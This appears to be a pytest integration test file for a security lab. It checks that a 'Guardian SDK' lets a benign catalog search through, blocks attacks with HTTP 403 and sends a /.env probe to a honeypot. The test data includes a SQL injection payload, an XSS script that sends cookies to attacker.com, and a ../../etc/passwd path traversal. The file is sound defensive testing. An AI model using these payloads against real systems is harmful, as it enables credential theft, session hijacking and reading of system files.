"""
End-to-End Integration Test Suite for Protected Target Application Lab
Verifies that the Guardian SDK attached to the sample target application:
- Allows legitimate user requests (HTTP 200)
- Blocks high-severity attacks (HTTP 403 Forbidden)
- Diverts decoy reconnaissance probes to the Honeypot (HTTP 200 Deception)
"""

import os
import sys
import time
import subprocess
import pytest
import httpx

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

TARGET_APP_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "sample-target-app")
CONTROL_PLANE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

TARGET_PORT = 3005
TARGET_URL = f"http://127.0.0.1:{TARGET_PORT}"
CONTROL_PLANE_PORT = 8005
CONTROL_PLANE_URL = f"http://127.0.0.1:{CONTROL_PLANE_PORT}"

@pytest.fixture(scope="module")
def run_servers():
    """Starts control plane and sample target app subprocesses, then tears them down."""
    # 1. Start Control Plane on port 8005
    cp_env = os.environ.copy()
    cp_proc = subprocess.Popen(
        [sys.executable, "-m", "uvicorn", "main:app", "--host", "127.0.0.1", "--port", str(CONTROL_PLANE_PORT)],
        cwd=CONTROL_PLANE_DIR,
        env=cp_env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # Wait for control plane health
    cp_ready = False
    for _ in range(30):
        try:
            r = httpx.get(f"{CONTROL_PLANE_URL}/health", timeout=0.5)
            if r.status_code == 200:
                cp_ready = True
                break
        except Exception:
            time.sleep(0.3)

    if not cp_ready:
        cp_proc.terminate()
        pytest.fail("Control plane failed to start within timeout.")

    # 2. Start Target App on port 3005
    target_env = os.environ.copy()
    target_env["PORT"] = str(TARGET_PORT)
    target_env["GUARDIAN_CONTROL_PLANE"] = CONTROL_PLANE_URL
    target_env["GUARDIAN_API_KEY"] = "guardian-prod-demo-key-2026"

    target_proc = subprocess.Popen(
        ["node", "server.js"],
        cwd=TARGET_APP_DIR,
        env=target_env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # Wait for target app health
    target_ready = False
    for _ in range(30):
        try:
            r = httpx.get(f"{TARGET_URL}/api/health", timeout=0.5)
            if r.status_code == 200:
                target_ready = True
                break
        except Exception:
            time.sleep(0.3)

    if not target_ready:
        target_proc.terminate()
        cp_proc.terminate()
        pytest.fail("Sample target app failed to start within timeout.")

    yield TARGET_URL

    # Teardown
    try:
        target_proc.terminate()
        target_proc.wait(timeout=2)
    except Exception:
        target_proc.kill()

    try:
        cp_proc.terminate()
        cp_proc.wait(timeout=2)
    except Exception:
        cp_proc.kill()


def test_benign_product_search(run_servers):
    """Verify legitimate searches pass through the SDK with HTTP 200 OK."""
    url = run_servers
    res = httpx.get(f"{url}/api/catalog/search?q=router", timeout=2.0)
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "success"
    assert len(data["products"]) > 0
    assert any("Router" in p["name"] for p in data["products"])


def test_sqli_attack_blocked_with_403(run_servers):
    """Verify SQL injection against catalog search is blocked with HTTP 403 Forbidden."""
    url = run_servers
    sqli_payload = "1' UNION SELECT 1,2,password_hash FROM users--"
    res = httpx.get(f"{url}/api/catalog/search", params={"q": sqli_payload}, timeout=2.0)
    assert res.status_code == 403
    data = res.json()
    assert "error" in data
    assert "Access Denied by AI Cyber Guardian" in data["error"]
    assert data["decision"] == "BLOCK"


def test_xss_attack_blocked_with_403(run_servers):
    """Verify stored XSS submission in reviews is blocked with HTTP 403 Forbidden."""
    url = run_servers
    xss_payload = {
        "product_id": 101,
        "author": "Attacker",
        "rating": 1,
        "comment": "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>"
    }
    res = httpx.post(f"{url}/api/reviews", json=xss_payload, timeout=2.0)
    assert res.status_code == 403
    data = res.json()
    assert "Access Denied" in data["error"]


def test_path_traversal_blocked_with_403(run_servers):
    """Verify LFI / Path Traversal attempt is blocked with HTTP 403 Forbidden."""
    url = run_servers
    res = httpx.get(f"{url}/api/files/view?doc=../../../../etc/passwd", timeout=2.0)
    assert res.status_code == 403
    data = res.json()
    assert "Access Denied" in data["error"]


def test_decoy_env_diverted_to_honeypot(run_servers):
    """Verify accessing decoy /.env is diverted to honeypot, returning Canary AWS tokens."""
    url = run_servers
    res = httpx.get(f"{url}/.env", timeout=3.0)
    assert res.status_code == 200
    content = res.text
    # Honeypot decoy .env contains AWS Canary honeytokens
    assert "AWS_ACCESS_KEY_ID" in content
    assert "AKIA" in content
